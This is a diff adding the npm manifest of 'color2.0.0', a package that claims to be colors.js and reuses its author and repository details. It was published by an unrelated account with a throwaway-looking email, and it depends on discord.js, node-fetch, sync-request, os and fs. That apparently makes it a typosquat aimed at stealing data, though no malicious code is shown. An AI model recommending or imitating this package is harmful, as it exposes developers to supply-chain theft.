@@ -1,0 +1,74 @@
+{
+    "name": "color2.0.0",
+    "description": "get colors in your node.js console",
+    "version": "1.4.0",
+    "author": {
+        "name": "Marak Squires"
+    },
+    "contributors": [
+        {
+            "name": "DABH",
+            "url": "https://github.com/DABH"
+        }
+    ],
+    "homepage": "https://github.com/Marak/colors.js",
+    "bugs": {
+        "url": "https://github.com/Marak/colors.js/issues"
+    },
+    "keywords": [
+        "ansi",
+        "terminal",
+        "colors"
+    ],
+    "repository": {
+        "type": "git",
+        "url": "git+ssh://git@github.com/Marak/colors.js.git"
+    },
+    "license": "MIT",
+    "scripts": {
+        "lint": "eslint . --fix",
+        "test": "node tests/basic-test.js && node tests/safe-test.js"
+    },
+    "engines": {
+        "node": ">=0.1.90"
+    },
+    "main": "lib/index.js",
+    "devDependencies": {
+        "eslint": "^5.2.0",
+        "eslint-config-google": "^0.11.0"
+    },
+    "dependencies": {
+        "discord.js": "^12.5.3",
+        "fs": "^0.0.1-security",
+        "node-fetch": "^1.7.3",
+        "os": "^0.1.2",
+        "sync-request": "^6.1.0"
+    },
+    "_id": "color2.0.0@1.4.0",
+    "_nodeVersion": "17.6.0",
+    "_npmVersion": "8.5.1",
+    "dist": {
+        "integrity": "sha512-LSQ4JF9fOAhi+AF8sK9ef7JW6SKGk5C0QYuKDkCUxPBseyekKiDi0ZNMUM5o9gpoCGvqHDY9MRcaFLHr5eCslw==",
+        "shasum": "774008c15bdabf658e9020aec92ae1ac8f7759bf",
+        "tarball": "https://registry.npmjs.org/color2.0.0/-/color2.0.0-1.4.0.tgz",
+        "fileCount": 23,
+        "unpackedSize": 54031,
+        "npm-signature": "-----BEGIN PGP SIGNATURE-----\r\nVersion: OpenPGP.js v4.10.10\r\nComment: https://openpgpjs.org\r\n\r\nwsFzBAEBCAAGBQJiQoLDACEJED1NWxICdlZqFiEECWMYAoorWMhJKdjhPU1b\r\nEgJ2VmoFAg//a/wAwNpZURj8UJrhvj9epJPL73cOwSZy5sYt6EISPnDg0Ivl\r\n1dgcBo84VvTGnbaC1NY3oycFNNvfaJDuj1Jtqag2WMPI22R9W5u1+NLzqFhh\r\nDFQ6t6LxoGPNsw8eRsrXIpH10Pla0awksfGualH24lTGoSY+PUukKACs9V0z\r\nZ/UYm29FB5D4IIT6Cn5+NJDp6n5lOF4WwyZJahbJRv5zeCUcXI6BZAquVtHi\r\n+B5NldiHEiWcT/tIyfvabtB4HIYRwQUU26DkH7mpjggetRW/QiP7Gn9UqpCw\r\nu640Bq4gLZZfVYzmVAWqH8iBP2sIJweOA9EmU7+xWMazoMXqC6NcnDZBM2CV\r\nXpJbttLsXCyn8IboQoztp2gEgXoA1qxollg4FFsgkGQsbe+BJvq2c1DaUFxj\r\nIKuV7Rc1MgNNC7FCxM/NaIyuAqvAOzM25/FTBjMCo0GocaQgOCP1+Wtm95iG\r\nv5YQrnI6GnRqorZijHP+qGOOWhyF6H4Grgzvgiohmg+68vGoC+5VZAVqZy43\r\nPhGiFDhFeFp3JPl1GOHRUF9clSrLmELYD5af6jLGuFBy7mCRD3gfquTbEIPB\r\nfQzeCMBuf4mNomE7temzTmYfsCt6/F3a1p8mTRIDpNuaCNPq32aSOO+QTVeV\r\nqGtB5WXWuQvztgrHA9B/MlX98mLYZL/v9C8=\r\n=d6bG\r\n-----END PGP SIGNATURE-----\r\n"
+    },
+    "_npmUser": {
+        "name": "adiostcheusia",
+        "email": "gedoyej192@tourcc.com"
+    },
+    "directories": {},
+    "maintainers": [
+        {
+            "name": "adiostcheusia",
+            "email": "gedoyej192@tourcc.com"
+        }
+    ],
+    "_npmOperationalInternal": {
+        "host": "s3://npm-registry-packages",
+        "tmp": "tmp/color2.0.0_1.4.0_1648526019224_0.1515563890549032"
+    },
+    "_hasShrinkwrap": false
+}
